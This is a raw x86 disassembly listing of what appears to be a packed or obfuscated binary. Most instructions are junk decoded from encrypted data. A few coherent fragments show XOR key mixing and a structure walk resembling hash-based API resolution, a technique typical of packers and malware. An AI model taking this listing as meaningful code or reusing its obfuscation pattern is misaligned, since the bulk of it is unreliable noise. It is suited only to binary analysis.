  405975:	mov    DWORD PTR [edi],ebp
  405977:	out    0x2a,eax
  405979:	mov    esi,0xcd33e29
  40597e:	mov    ah,0x6a
  405980:	clc    
  405981:	mov    DWORD PTR [ebp+0x62],esi
  405984:	dec    ebp
  405985:	mov    ah,0x90
  405987:	push   ebx
  405988:	enter  0x4013,0xaf
  40598c:	lods   eax,DWORD PTR ds:[esi]
  40598d:	push   ebp
  40598e:	add    DWORD PTR [ebx-0xf],edx
  405991:	ror    BYTE PTR [ebx-0x241fbdc],cl
  405997:	fucomip st,st(5)
  405999:	div    DWORD PTR [ebx]
  40599b:	jne    0x405992
  40599d:	dec    esi
  40599e:	xor    ecx,ecx
  4059a0:	loopne 0x405967
  4059a2:	pop    eax
  4059a3:	fwait
  4059a4:	aam    0xe7
  4059a6:	pop    esi
  4059a7:	jg     0x405950
  4059a9:	push   edi
  4059aa:	xor    dh,bl
  4059ac:	jmp    0x48df:0xdec02043
  4059b3:	retf   
  4059b4:	push   esp
  4059b5:	shr    DWORD PTR [eax],1
  4059b7:	pop    ss
  4059b8:	add    DWORD PTR [edi+eiz*2-0x38be5b5c],ecx
  4059bf:	push   ebp
  4059c0:	test   cl,bl
  4059c2:	repnz imul BYTE PTR [eax-0x8d9338]
  4059c9:	cdq    
  4059ca:	daa    
  4059cb:	les    eax,FWORD PTR [ecx+0x5ff40735]
  4059d1:	xchg   DWORD PTR [edi-0x78f100bb],ecx
  4059d7:	or     dl,cl
  4059d9:	fidivr DWORD PTR [esi-0x19]
  4059dc:	hlt    
  4059dd:	jnp    0x4059c7
  4059df:	sar    BYTE PTR [ebp+0x59],1
  4059e2:	pop    esi
  4059e3:	in     al,dx
  4059e4:	mov    dh,BYTE PTR [esi+0x5f]
  4059e7:	mov    es,WORD PTR [ecx-0x58]
  4059ea:	push   esp
  4059eb:	inc    ecx
  4059ec:	(bad)
  4059f1:	jo     0x4059a6
  4059f3:	mov    dl,0xab
  4059f5:	add    ebp,DWORD PTR [ebx]
  4059f7:	pop    edi
  4059f8:	dec    ebx
  4059f9:	mov    ch,0x3
  4059fb:	out    0x61,eax
  4059fd:	xchg   edx,eax
  4059fe:	push   ebx
  4059ff:	ins    DWORD PTR es:[edi],dx
  405a00:	adc    al,BYTE PTR ds:0xbe92feb6
  405a06:	inc    edx
  405a07:	cdq    
  405a08:	int3   
  405a09:	retf   0xebca
  405a0c:	popf   
  405a0d:	sub    ecx,ebp
  405a0f:	inc    eax
  405a10:	mov    eax,ds:0xa24e2a23
  405a15:	loop   0x4059c1
  405a17:	or     eax,esp
  405a19:	or     eax,0xd2ecf6f6
  405a1e:	fsub   st,st(1)
  405a20:	and    al,0x56
  405a22:	and    DWORD PTR [ebp+0x53],edx
  405a25:	mov    bh,0x41
  405a27:	adc    ch,BYTE PTR [ecx-0x43d46a5b]
  405a2d:	mov    ah,0xfb
  405a2f:	cli    
  405a30:	aas    
  405a31:	adc    bh,al
  405a33:	inc    ebp
  405a34:	cld    
  405a35:	xor    al,0x85
  405a37:	pushf  
  405a38:	clc    
  405a39:	and    DWORD PTR ds:0x4336db,edx
  405a3f:	mov    eax,DWORD PTR [ebp-0x4]
  405a42:	mov    edx,DWORD PTR ds:0x4337ef
  405a48:	xor    DWORD PTR ds:0x4336c3,edx
  405a4e:	push   esi
  405a4f:	mov    DWORD PTR ds:0x4337e7,0x6ead
  405a59:	mov    esi,DWORD PTR [ebp-0x8]
  405a5c:	mov    edx,0x7510853
  405a61:	and    DWORD PTR ds:0x4336bf,ebx
  405a67:	xor    eax,edx
  405a69:	and    DWORD PTR ds:0x43379b,0x0
  405a73:	mov    ecx,DWORD PTR ds:0x43379b
  405a79:	inc    ecx
  405a7a:	mov    DWORD PTR ds:0x43379b,ecx
  405a80:	cmp    DWORD PTR ds:0x43379b,0x20
  405a87:	jne    0x405a99
  405a8d:	push   DWORD PTR [ebp-0x1c]
  405a90:	push   DWORD PTR [ebp-0x24]
  405a93:	call   DWORD PTR ds:0x412258
  405a99:	cmp    DWORD PTR ds:0x43379b,0x15
  405aa0:	jb     0x405a73
  405aa6:	xor    ecx,ecx
  405aa8:	add    ecx,DWORD PTR ds:0x4336fb
  405aae:	mov    ecx,DWORD PTR [ecx]
  405ab0:	sbb    DWORD PTR ds:0x4337d7,ecx
  405ab6:	xor    esi,edx
  405ab8:	mov    ecx,0x32729a
  405abd:	add    esi,ecx
  405abf:	jmp    0x405e93
  405ac4:	aam    0x49
  405ac6:	in     eax,0x76
  405ac8:	ins    DWORD PTR es:[edi],dx
  405ac9:	jb     0x405b1e
  405acb:	imul   ebx,DWORD PTR ds:0xc44d28f4,0x46bffe6b
  405ad5:	xor    edi,DWORD PTR [esp+edi*2-0x4b]
  405ad9:	jns    0x405b57
  405adb:	jl     0x405b11
  405add:	in     eax,dx
  405ade:	xchg   ebp,eax
  405adf:	push   edx
  405ae0:	cmp    ch,BYTE PTR [edi]
  405ae2:	add    BYTE PTR [eax-0x57],dh
  405ae5:	cwde   
  405ae6:	into   
  405ae7:	cwde   
  405ae8:	or     ebx,ecx
  405aea:	and    ebp,0xb48468d0
  405af0:	imul   ebx,DWORD PTR [edx],0xffffff9f
  405af3:	mov    eax,ds:0x47d95666
  405af8:	lods   al,BYTE PTR ds:[esi]
  405af9:	lock or eax,0xf30b244a
  405aff:	fisubr DWORD PTR [ecx+edi*8+0x2f544174]
  405b06:	sub    BYTE PTR [ebx-0x797a654],bh
  405b0c:	xchg   esi,eax
  405b0d:	retf   0xa01c
  405b10:	daa    
  405b11:	jg     0x405b63
  405b13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b14:	sbb    ebp,DWORD PTR [ebx+0x71]
  405b17:	mov    edx,0x125ff93e
  405b1c:	pop    edx
  405b1d:	sbb    eax,0x17bfccc8
  405b22:	sub    dh,BYTE PTR [ebx+0x44410b93]
  405b28:	or     eax,0x4cf7620
  405b2d:	mov    ecx,0x6a944330
  405b32:	idiv   BYTE PTR [ebx-0x4b8f30ca]
  405b38:	jbe    0x405ba9
  405b3a:	fsubr  st,st(4)
  405b3c:	addr16 cmp eax,0xe48c665b
  405b42:	fwait
  405b43:	mov    dl,0x56
  405b45:	jle    0x405b4b
  405b47:	cld    
  405b48:	int3   
  405b49:	jecxz  0x405b96
  405b4b:	and    DWORD PTR [esi+0x63],0x43
  405b4f:	retf   
  405b50:	stos   BYTE PTR es:[edi],al
  405b51:	pop    ebp
  405b52:	mov    WORD PTR [edi+edi*2-0x6a],cs
  405b56:	pop    esi
  405b57:	cmp    BYTE PTR [edx-0x50],bl
  405b5a:	pop    ebp
  405b5b:	mov    ecx,0x40873463
  405b60:	jmp    0xbdba:0x56b88094
  405b67:	pop    eax
  405b68:	inc    ebx
  405b69:	call   0xf1a687c5
  405b6e:	push   esi
  405b6f:	int3   
  405b70:	(bad)  
  405b71:	jl     0x405be3
  405b73:	and    eax,0xad42bb3
  405b78:	sbb    DWORD PTR [esi],ecx
  405b7a:	dec    ebx
  405b7b:	and    BYTE PTR ds:0x3bfe165a,bl
  405b81:	loop   0x405bcc
  405b83:	or     DWORD PTR [edi+0x28],edi
  405b86:	pusha  
  405b87:	daa    
  405b88:	xchg   ebp,eax
  405b89:	popf   
  405b8a:	cmp    dh,dl
  405b8c:	aaa    
  405b8d:	call   0xee57:0xf422da7a
  405b94:	les    edx,FWORD PTR [ebx+0x5]
  405b97:	inc    bh
  405b99:	ror    dh,1
  405b9b:	sub    al,0x73
  405b9d:	repz int 0x75
  405ba0:	shr    BYTE PTR [esi],cl
  405ba2:	pop    edi
  405ba3:	test   BYTE PTR [ebp-0x6031ae73],ch
  405ba9:	push   eax
  405baa:	add    dh,BYTE PTR [edi]
  405bac:	sbb    edx,DWORD PTR [eax-0x4d]
  405baf:	add    dh,BYTE PTR [esi]
  405bb1:	jmp    0x6919:0x86e3102b
  405bb8:	push   edx
  405bb9:	aad    0x35
  405bbb:	loopne 0x405ba3
  405bbd:	outs   dx,DWORD PTR ds:[esi]
  405bbe:	fnstcw WORD PTR [ebx+0x19808b0e]
  405bc4:	sbb    eax,0xab046423
  405bc9:	sub    BYTE PTR [esi-0x4abc741a],bl
  405bcf:	push   esi
  405bd0:	imul   esp,DWORD PTR [ecx],0xa2302a26
  405bd6:	push   es
  405bd7:	sbb    DWORD PTR [bx+0x502f],0xfffffff8
  405bdd:	xor    BYTE PTR [ecx],dl
  405bdf:	mov    DWORD PTR [ebx],edi
  405be1:	icebp  
  405be2:	arpl   WORD PTR [ebp+0x6ea452c4],cx
  405be8:	jl     0x405c40
  405bea:	inc    ebx
  405beb:	div    DWORD PTR [ecx+0x6e]
  405bee:	test   DWORD PTR [ebp+0x4050e3d6],ebx
  405bf4:	add    eax,0xbd867e95
  405bf9:	jae    0x405bed
  405bfb:	mov    al,ds:0x93ab1328
  405c00:	lea    edi,[esi-0x6a74a6a]
  405c06:	shl    DWORD PTR [ebx-0x59388df5],1
  405c0c:	test   BYTE PTR fs:[ebx-0x3535a0ae],ah
  405c13:	fnstenv [edx+0x16]
  405c16:	jb     0x405bfe
  405c18:	sbb    ebp,eax
  405c1a:	and    BYTE PTR [edi],ch
  405c1c:	ins    DWORD PTR es:[edi],dx
  405c1d:	arpl   WORD PTR [edi+0xf],si
  405c20:	push   edx
  405c21:	leave  
  405c22:	int    0x5f
  405c24:	and    DWORD PTR [esi+ebp*1-0xf],eax
  405c28:	repz xor al,0x23
  405c2b:	ja     0x405c26
  405c2d:	jnp    0x405c3a
  405c2f:	xchg   DWORD PTR [ecx-0x1a],esi
  405c32:	cmp    ebx,0x533b244c
  405c38:	sar    bh,1
  405c3a:	push   ebp
  405c3b:	cmc    
  405c3c:	inc    eax
  405c3d:	(bad)  
  405c3e:	adc    ebp,DWORD PTR [edx-0xd]
  405c41:	adc    ecx,edi
  405c43:	adc    DWORD PTR [esi-0x56],esi
  405c46:	pushf  
  405c47:	ins    BYTE PTR es:[edi],dx
  405c48:	ror    bh,0xa0
  405c4b:	fmul   QWORD PTR [edx-0x33]
  405c4e:	mov    bh,0x93
  405c50:	shl    DWORD PTR [eax+0x54],1
  405c53:	jno    0x405cc8
  405c55:	mov    ebx,0x27ca9bbc
  405c5a:	mov    al,BYTE PTR [ebx]
  405c5c:	xchg   edx,eax
  405c5d:	imul   DWORD PTR [esi]
  405c5f:	lock int3 
  405c61:	arpl   WORD PTR [ebx-0x69],si
  405c64:	xchg   edi,eax
  405c65:	jne    0x405c1f
  405c67:	jle    0x405c61
  405c69:	call   0x7aae:0x8e473584
  405c70:	rol    BYTE PTR [eax],cl
  405c72:	xchg   ebx,eax
  405c73:	test   al,0xe2
  405c75:	dec    edi
  405c76:	imul   DWORD PTR [ecx+edi*8-0x47]
  405c7a:	js     0x405cac
  405c7c:	dec    ebp
  405c7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c7e:	dec    ebp
  405c7f:	mov    ebx,edi
  405c81:	pop    ebp
  405c82:	mov    edi,0x7c1d12e1
  405c87:	sbb    al,BYTE PTR [ebp+0x5e]
  405c8a:	jp     0x405cea
  405c8c:	sub    edx,edi
  405c8e:	retf   0x735b
  405c91:	das    
  405c92:	inc    eax
  405c93:	outs   dx,BYTE PTR ds:[esi]
  405c94:	stc    
  405c95:	out    0x2e,al
  405c97:	sub    ebp,0xffffffbb
  405c9a:	pop    edx
  405c9b:	aad    0xa8
  405c9d:	mov    ebx,0xf09ae9c7
  405ca2:	and    DWORD PTR [ebp+0x5d805a3a],ebx
  405ca8:	cwde   
  405ca9:	out    0xc1,eax
  405cab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405cac:	or     eax,0x5dced953
  405cb1:	jb     0x405d1a
  405cb3:	aad    0x19
  405cb5:	loop   0x405c6e
  405cb7:	jo     0x405c98
  405cb9:	ins    BYTE PTR es:[edi],dx
  405cba:	psubsb mm1,QWORD PTR [edi+0x3bcc3d0e]
  405cc1:	pop    es
  405cc2:	ret    0xe510
  405cc5:	cmp    eax,0x52f67ab
  405cca:	sbb    DWORD PTR [ecx+0x6cc54ce2],edx
  405cd0:	js     0x405ce0
  405cd2:	or     cl,BYTE PTR [esi]
  405cd4:	aaa    
  405cd5:	into   
  405cd6:	xor    esi,edx
  405cd8:	push   0x1b5a4a66
  405cdd:	cmp    al,0xee
  405cdf:	(bad)  
  405ce0:	jmp    0xdd40:0xa794c4df
  405ce7:	sub    al,0x3d
  405ce9:	fwait
  405cea:	inc    esp
  405ceb:	mov    dl,0x3f
  405ced:	pop    ecx
  405cee:	addr16 retf 
  405cf0:	jg     0x405d3b
  405cf2:	out    0x34,al
  405cf4:	push   ebx
  405cf5:	add    al,0x13
  405cf7:	inc    edx
  405cf8:	shr    DWORD PTR [ecx],0x32
  405cfb:	jbe    0x405cd4
  405cfd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405cfe:	test   DWORD PTR [edx-0xf7db409],esi
  405d04:	enter  0x46a3,0x61
  405d08:	loope  0x405cb6
  405d0a:	cli    
  405d0b:	fldcw  WORD PTR [ebp-0x33]
  405d0e:	and    esi,DWORD PTR [ebp+0x4c]
  405d11:	pushf  
  405d12:	lods   al,BYTE PTR ds:[esi]
  405d13:	inc    edx
  405d14:	or     dl,bh
  405d16:	outs   dx,BYTE PTR ds:[esi]
  405d17:	push   esp
  405d18:	leave  
  405d19:	mov    edx,gs
  405d1b:	pop    edi
  405d1c:	lea    ebp,[edx+0x1eb1d182]
  405d22:	dec    ebx
  405d23:	imul   edi,esp,0xb943b045
  405d29:	and    al,0x76
  405d2b:	mov    dl,0x1f
  405d2d:	mov    ds:0xa9c4c4ec,al
  405d32:	imul   edi,DWORD PTR [esi+eiz*8+0x27c179ca],0xffffffe4
  405d3a:	pop    eax
  405d3b:	mov    eax,0x1fcb73c5
  405d40:	loop   0x405d45
  405d42:	out    0x9d,al
  405d44:	inc    esi
  405d45:	(bad)  
  405d46:	mov    esp,DWORD PTR [ecx]
  405d48:	fist   WORD PTR [ebp+0x149cf72a]
  405d4e:	xor    DWORD PTR [edi+0x20],ecx
  405d51:	shr    al,0x52
  405d54:	mov    ecx,0xe48982ad
  405d59:	add    DWORD PTR [edx],ebx
  405d5b:	outs   dx,DWORD PTR ds:[esi]
  405d5c:	mov    ds:0x3064f37e,al
  405d61:	inc    esp
  405d62:	test   eax,0xccf3ef29
  405d67:	xchg   DWORD PTR [eax+0x7f77f3cb],ebx
  405d6d:	rcl    BYTE PTR gs:[edx-0x6a],cl
  405d71:	arpl   WORD PTR [ebx-0x6f],bx
  405d74:	inc    esi
  405d75:	add    DWORD PTR [eax],esi
  405d77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d78:	push   edx
  405d79:	(bad)  
  405d7a:	jle    0x405dbb
  405d7c:	and    bl,BYTE PTR [esi+0x471af90d]
  405d82:	add    BYTE PTR [edi+0x6313ffa],bl
  405d88:	inc    esp
  405d89:	sbb    BYTE PTR [ebp-0x6d],bl
  405d8c:	push   ebx
  405d8d:	mov    esp,DWORD PTR [esi]
  405d8f:	mov    edx,ebp
  405d91:	jle    0x405d43
  405d93:	and    al,0x7f
  405d95:	lods   al,BYTE PTR ds:[esi]
  405d96:	jge    0x405d97
  405d98:	(bad)  
  405d99:	ret    0x56e7
  405d9c:	fs pop ebp
  405d9e:	adc    esi,esp
  405da0:	iret   
  405da1:	test   eax,edi
  405da3:	outs   dx,BYTE PTR ds:[esi]
  405da4:	xor    al,BYTE PTR [eax+0xb6e4bbd]
  405daa:	xor    esi,ebx
  405dac:	loop   0x405e05
  405dae:	sbb    DWORD PTR [esi],eax
  405db0:	fld    TBYTE PTR ds:0xc0423cd6
  405db6:	xchg   edi,eax
  405db7:	js     0x405dbf
  405db9:	test   al,0x54
  405dbb:	clc    
  405dbc:	jle    0x405e3a
  405dbe:	je     0x405dc3
  405dc0:	retfw  0x5ba4
  405dc4:	retf   0xdb77
  405dc7:	scas   eax,DWORD PTR es:[edi]
  405dc8:	les    esi,FWORD PTR [ecx-0x38]
  405dcb:	ins    DWORD PTR es:[edi],dx
  405dcc:	mov    bl,cl
  405dce:	js     0x405d7d
  405dd0:	pop    ecx
  405dd1:	inc    esp
  405dd2:	jae    0x405d9c
  405dd4:	test   al,0xa5
  405dd6:	inc    edi
  405dd7:	mov    esi,DWORD PTR [ebx-0x37c39606]
  405ddd:	mov    edx,0x73cdf5a
  405de2:	punpckhwd mm4,mm3
  405de5:	lods   eax,DWORD PTR ds:[esi]
  405de6:	aaa    
  405de7:	add    bl,BYTE PTR [edi-0x720fc8fc]
  405ded:	enter  0xb72,0x2c
  405df1:	mov    bl,0x9a
  405df3:	ins    DWORD PTR es:[edi],dx
  405df4:	repnz (bad) 
  405df6:	imul   ebx,edi,0x652d8bde
  405dfc:	push   0x7b876400
  405e01:	xor    al,0x30
  405e03:	pop    es
  405e04:	push   ecx
  405e05:	push   eax
  405e06:	ins    DWORD PTR es:[edi],dx
  405e07:	and    eax,edx
  405e09:	test   eax,0xf92b1726
  405e0e:	lahf   
  405e0f:	stc    
  405e10:	jnp    0x405db5
  405e12:	xor    ebp,DWORD PTR [eax-0x43]
  405e15:	into   
  405e16:	imul   edi,esp,0x54
  405e19:	(bad)  
  405e1a:	daa    
  405e1b:	mov    ecx,0xa33c6cfa
  405e20:	jg     0x405dbe
  405e22:	aam    0xb7
  405e24:	add    bl,ah
  405e26:	mov    esi,0x878a0d73
  405e2b:	and    BYTE PTR [edi],bl
  405e2d:	jbe    0x405e02
  405e2f:	push   eax
  405e30:	inc    ebx
  405e31:	iret   
  405e32:	outs   dx,DWORD PTR ds:[esi]
  405e33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e34:	add    al,0xd3
  405e36:	push   esi
  405e37:	sub    al,0x78
  405e39:	xchg   edi,eax
  405e3a:	xchg   esp,eax
  405e3b:	ds push cs
  405e3d:	xor    al,0xd5
  405e3f:	pushf  
  405e40:	lock in al,0xa8
  405e43:	inc    eax
  405e44:	outs   dx,BYTE PTR ds:[esi]
  405e45:	sub    ebx,esi
  405e47:	cmp    eax,0xd0649b61
  405e4c:	sbb    al,0xba
  405e4e:	sbb    DWORD PTR [esi+0x3c7220c9],esi
  405e54:	stos   DWORD PTR es:[edi],eax
  405e55:	aaa    
  405e56:	dec    esp
  405e57:	cmp    ah,BYTE PTR [edx]
  405e59:	mov    al,0x79
  405e5b:	jmp    0xfc34:0x1926769f
  405e62:	pop    esi
  405e63:	std    
  405e64:	mov    ch,0x18
  405e66:	shr    BYTE PTR [edi+eax*1],0xc5
  405e6a:	dec    ebx
  405e6b:	retf   
  405e6c:	jno    0x405e46
  405e6e:	mov    edi,DWORD PTR [esi+0x1f]
  405e71:	daa    
  405e72:	stc    
  405e73:	adc    al,BYTE PTR [esi+0x7c]
  405e76:	pusha  
  405e77:	xchg   esp,eax
  405e78:	fsub   QWORD PTR [edi-0x2e]
  405e7b:	ins    BYTE PTR es:[edi],dx
  405e7c:	and    eax,0x71cc88c6
  405e81:	cmp    eax,0xaaa3dca5
  405e86:	cmp    al,0x11
  405e88:	fbstp  TBYTE PTR [esi]
  405e8a:	add    eax,0x30978b8f
  405e8f:	cwde   
  405e90:	push   0xc103a987
  405e95:	imul   eax,esi
  405e98:	mov    esi,DWORD PTR [ebp+0xc]
  405e9b:	cmp    esi,eax
  405e9d:	jne    0x405eb9
  405ea3:	mov    eax,DWORD PTR [ebp-0x4]
  405ea6:	mov    esi,DWORD PTR [ebp-0x8]
  405ea9:	xor    eax,edx
  405eab:	xor    esi,edx
  405ead:	add    eax,ecx
  405eaf:	add    esi,ecx
  405eb1:	imul   eax,esi
  405eb4:	jmp    0x4062c8
  405eb9:	mov    eax,DWORD PTR [ebp+0xc]
  405ebc:	mov    eax,DWORD PTR [eax+0x78]
  405ebf:	mov    DWORD PTR [ebp+0xc],eax
  405ec2:	mov    eax,DWORD PTR [ebp-0x4]
  405ec5:	jmp    0x406299
  405eca:	bound  edx,QWORD PTR [eax-0x1c8e3b49]
  405ed0:	jge    0x405e84
  405ed2:	pop    ecx
  405ed3:	jo     0x405ebe
  405ed5:	mov    esi,0x60e6e686
  405eda:	(bad)  
  405edb:	aas    
  405edc:	jl     0x405f5a
  405ede:	mov    ch,0x79
  405ee0:	jl     0x405f5e
  405ee2:	dec    edx
  405ee3:	xor    BYTE PTR [ebx+0x60],dl
  405ee6:	adc    ebp,DWORD PTR [ebp+0x6855b9dc]
  405eec:	mov    ecx,0x56820470
  405ef1:	jb     0x405ea7
  405ef3:	sub    al,0x77
  405ef5:	test   eax,0x16913f82
  405efa:	cs into 
  405efc:	and    al,0x2a
  405efe:	or     al,BYTE PTR [esp+eax*8-0x41493477]
  405f05:	addr16 jmp 0x730f:0x827cf441
  405f0d:	xchg   ecx,eax
  405f0e:	or     esp,edx
  405f10:	adc    DWORD PTR [eax],esi
  405f12:	outs   dx,BYTE PTR ds:[esi]
  405f13:	outs   dx,BYTE PTR ds:[esi]
  405f14:	out    dx,al
  405f15:	sub    ah,BYTE PTR ss:[ebp+0x567ed700]
  405f1c:	mov    cl,BYTE PTR [edi-0x4e]
  405f1f:	mov    ecx,0xe43a87df
  405f24:	add    al,0x45
  405f26:	sti    
  405f27:	and    ecx,ebx
  405f29:	cmc    
  405f2a:	sub    al,BYTE PTR [ebx+esi*8-0x67]
  405f2e:	add    BYTE PTR [edx+0x401522a3],dh
  405f34:	test   DWORD PTR [eax+0x5],ebp
  405f37:	and    dl,BYTE PTR [eax+eax*8-0x44]
  405f3b:	xor    ebp,ecx
  405f3d:	mov    ds:0xa22be3fa,al
  405f42:	bound  esp,QWORD PTR [ecx-0x65cf90dd]
  405f48:	jne    0x405f83
  405f4a:	jne    0x405f30
  405f4c:	sub    DWORD PTR [esi],eax
  405f4e:	push   ebp
  405f4f:	fisub  DWORD PTR [edi]
  405f51:	push   cs
  405f52:	push   0xc12984d5
  405f57:	mov    edi,0x7bef3974
  405f5c:	bound  eax,QWORD PTR [eax-0x47]
  405f5f:	(bad)  
  405f60:	sbb    DWORD PTR [edx+0x51],ecx
  405f63:	outs   dx,DWORD PTR ds:[esi]
  405f64:	xchg   bh,ch
  405f66:	mov    DWORD PTR [edi],ecx
  405f68:	repz out dx,eax
  405f6a:	cmp    al,0x57
  405f6c:	or     BYTE PTR [edi-0x12],al
  405f6f:	enter  0x876c,0xc8
  405f73:	(bad)  
  405f74:	fsubr  QWORD PTR [ebx+edi*1-0x7ca935f9]
  405f7b:	sysenter 
  405f7d:	rcr    DWORD PTR [ebx],cl
  405f7f:	dec    esi
  405f80:	jb     0x405fb6
  405f82:	in     al,0x10
  405f84:	push   edx
  405f85:	shl    dh,0xaf
  405f88:	sbb    ch,BYTE PTR [edi]
  405f8a:	pusha  
  405f8b:	out    0x8c,eax
  405f8d:	pop    esi
  405f8e:	sbb    BYTE PTR [ebp+0x5c7a24f0],dh
  405f94:	inc    esp
  405f95:	test   DWORD PTR [esi+esi*2+0x36775638],0xa9a02f6e
  405fa0:	dec    eax
  405fa1:	push   esp
  405fa2:	add    eax,0x5748f913
  405fa7:	push   eax
  405fa8:	mov    eax,0xd153a368
  405fad:	cmp    al,0x34
  405faf:	inc    edx
  405fb0:	or     BYTE PTR [edi+0xb2e9e29],0x41
  405fb7:	loope  0x405f81
  405fb9:	sub    ebp,DWORD PTR [eax]
  405fbb:	je     0x405f99
  405fbd:	in     al,dx
  405fbe:	jl     0x405fc9
  405fc0:	shl    DWORD PTR [esi],1
  405fc2:	(bad)  
  405fc3:	xchg   edx,eax
  405fc4:	xchg   edx,eax
  405fc5:	call   0x9493271b
  405fca:	stos   DWORD PTR es:[edi],eax
  405fcb:	xchg   ebp,eax
  405fcc:	and    DWORD PTR [ebx-0x69104bfe],esp
  405fd2:	xor    al,ah
  405fd4:	test   bl,ch
  405fd6:	enter  0xd6c4,0x85
  405fda:	push   ebp
  405fdb:	clc    
  405fdc:	ins    BYTE PTR es:[edi],dx
  405fdd:	imul   esp,DWORD PTR [ebx+eax*1+0x5c],0x15
  405fe2:	ret    
  405fe3:	sub    dl,BYTE PTR [esi]
  405fe5:	ja     0x405fc1
  405fe7:	xor    BYTE PTR [ebp+ebp*4-0xe],0x59
  405fec:	pop    esp
  405fed:	push   0x64
  405fef:	jmp    0x4623:0xa3ce1494
  405ff6:	xchg   BYTE PTR [ebx],cl
  405ff8:	mov    ebp,DWORD PTR [edi+eax*8+0x7a8c0500]
  405fff:	add    bl,BYTE PTR [eax]
  406001:	dec    ecx
  406002:	adc    ebp,DWORD PTR [eax+ecx*1]
  406005:	cld    
  406006:	lock cwde 
  406008:	push   0xc47f8408
  40600d:	arpl   WORD PTR [ebx+0x5b],si
  406010:	or     ah,BYTE PTR [esp+edx*4-0x1a4b5b66]
  406017:	(bad)  
  406018:	call   0xfd4b:0x3e19ccc6
  40601f:	sub    al,0xe7
  406021:	push   ecx
  406022:	mov    cl,0x6e
  406024:	jl     0x40603f
  406026:	mov    ebx,0xac1b8b6e
  40602b:	dec    ebp
  40602c:	repz dec ebp
  40602e:	data16 jne 0x406022
  406031:	inc    ebx
  406032:	retf   
  406033:	jnp    0x406012
  406035:	mov    bh,0xaa
  406037:	std    
  406038:	add    ah,BYTE PTR [edi-0x4d]
  40603b:	inc    ecx
  40603c:	stos   BYTE PTR es:[edi],al
  40603d:	adc    BYTE PTR ds:0xd42a52c1,cl
  406043:	test   BYTE PTR [edx-0x11e9b657],bl
  406049:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40604a:	cld    
  40604b:	xchg   ecx,eax
  40604c:	adc    bl,bl
  40604e:	mov    bl,0x83
  406050:	and    ebx,0xffffff8d
  406053:	push   0x74ac194e
  406058:	sub    al,0x95
  40605a:	out    0x14,al
  40605c:	mov    eax,ds:0x8f236bc2
  406061:	popf   
  406062:	mov    al,0x1d
  406064:	mov    esp,es
  406066:	out    0xb0,eax
  406068:	mov    ch,0x8c
  40606a:	in     eax,0xdd
  40606c:	stc    
  40606d:	mov    al,0x8e
  40606f:	adc    ch,BYTE PTR [edi]
  406071:	sbb    DWORD PTR [ebp+edi*8+0x1d],ecx
  406075:	adc    edi,DWORD PTR ss:[esi+0x3c1c338e]
  40607c:	lock xor eax,0x8cfe34e1
  406082:	stos   DWORD PTR es:[edi],eax
  406083:	jb     0x4060f0
  406085:	cmp    eax,0x97f654e3
  40608a:	in     al,0xb2
  40608c:	cld    
  40608d:	cmp    al,0x7b
  40608f:	retf   
  406090:	jge    0x406064
  406092:	mov    ds:0x728e0f2c,eax
  406097:	mov    eax,DWORD PTR [ebx+0x9b2c142]
  40609d:	jge    0x406096
  40609f:	call   0xf53f:0x308b825b
  4060a6:	(bad)  
  4060a7:	dec    esp
  4060a8:	xchg   ebp,eax
  4060a9:	sub    al,0xe7
  4060ab:	adc    dh,BYTE PTR [edi-0x25]
  4060ae:	loope  0x40606a
  4060b0:	ins    DWORD PTR es:[edi],dx
  4060b1:	mov    eax,ds:0xcece64f6
  4060b6:	(bad)  
  4060b7:	jo     0x40604f
  4060b9:	adc    DWORD PTR [esi],0x6d
  4060bc:	test   BYTE PTR [ebx+0x3c],cl
  4060bf:	mov    ebx,0xff3e6b2a
  4060c4:	stc    
  4060c5:	push   edx
  4060c6:	pushf  
  4060c7:	mov    esp,0xf43f173b
  4060cc:	pop    edx
  4060cd:	inc    edx
  4060ce:	add    ebp,edx
  4060d0:	push   ebx
  4060d1:	sbb    BYTE PTR [esi],ah
  4060d3:	retf   0x8596
  4060d6:	scas   al,BYTE PTR es:[edi]
  4060d7:	or     BYTE PTR [edi],al
  4060d9:	gs hlt 
  4060db:	loope  0x4060e8
  4060dd:	dec    esp
  4060de:	jle    0x406157
  4060e0:	xchg   esi,eax
  4060e1:	jge    0x40615b
  4060e3:	repz pop edx
  4060e5:	sub    BYTE PTR [eax+0x9],dh
  4060e8:	out    dx,eax
  4060e9:	push   edi
  4060ea:	movlps QWORD PTR [esi],xmm0
  4060ed:	adc    al,0x6f
  4060ef:	cmp    BYTE PTR [edi+0x6ef1653e],al
  4060f5:	push   0x1ca01845
  4060fa:	push   edi
  4060fb:	bound  edx,QWORD PTR [eax]
  4060fd:	cmp    BYTE PTR [esp+edx*4],dh
  406100:	mov    esp,0xba7c8d18
  406105:	pop    edi
  406106:	and    BYTE PTR [ecx+0x7a9f77ab],bl
  40610c:	fwait
  40610d:	lds    ecx,FWORD PTR [ecx-0x7202578e]
  406113:	ja     0x40614a
  406115:	je     0x40613a
  406117:	shl    ebp,1
  406119:	xlat   BYTE PTR ds:[ebx]
  40611a:	test   eax,0x7fb7670d
  40611f:	or     al,0xd1
  406121:	inc    ecx
  406122:	jnp    0x406180
  406124:	outs   dx,DWORD PTR ds:[esi]
  406125:	repnz or ebx,esp
  406128:	shr    BYTE PTR [ecx+ebp*2],0xe9
  40612c:	ror    BYTE PTR [esi],1
  40612e:	rcl    BYTE PTR [ebp-0x1f0de4b7],1
  406134:	loope  0x406152
  406136:	out    0xeb,al
  406138:	dec    esp
  406139:	mov    bl,0x4
  40613b:	add    edx,DWORD PTR [ebp+0x20685340]
  406141:	pop    edi
  406142:	js     0x40614c
  406144:	int3   
  406145:	pop    ebx
  406146:	enter  0xa873,0x5d
  40614a:	push   esp
  40614b:	hlt    
  40614c:	sub    BYTE PTR ds:0x46e88312,ah
  406152:	xlat   BYTE PTR ds:[ebx]
  406153:	enter  0x279b,0x55
  406157:	aam    0x32
  406159:	jno    0x4060ed
  40615b:	dec    ebp
  40615c:	xchg   ebp,eax
  40615d:	xchg   esi,eax
  40615e:	mov    dl,0xfa
  406160:	sub    al,0x4
  406162:	arpl   WORD PTR [ebp+0x4d5a1d20],sp
